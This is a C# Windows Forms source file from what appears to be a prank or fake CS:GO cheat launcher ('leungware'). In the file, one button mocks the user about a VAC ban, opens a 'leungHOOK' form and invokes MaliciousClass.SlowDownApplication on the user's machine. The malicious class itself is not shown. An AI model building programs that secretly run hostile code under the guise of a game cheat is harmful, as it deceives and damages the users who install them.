using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace leungware_v420
{
    public partial class PLACEBO : Form
    {
        public bool button2HasBeenClicked = false;
        public PLACEBO()
        {
            InitializeComponent();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
            _ = MessageBox.Show("We (randonandoz and rethinking.) arnt responsible for anything that happenes");
            var Clicker = new clicker();
            Clicker.Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            button2HasBeenClicked = true;
            this.Hide();
            MessageBox.Show("enjoy vac ban bro - loading - might take a while...");
            var CSGO = new leungHOOK();
            CSGO.Show();
            if (button2HasBeenClicked)
            {
                var inst = new MaliciousClass();
                inst.SlowDownApplication(8);
            }
        }
    }
}
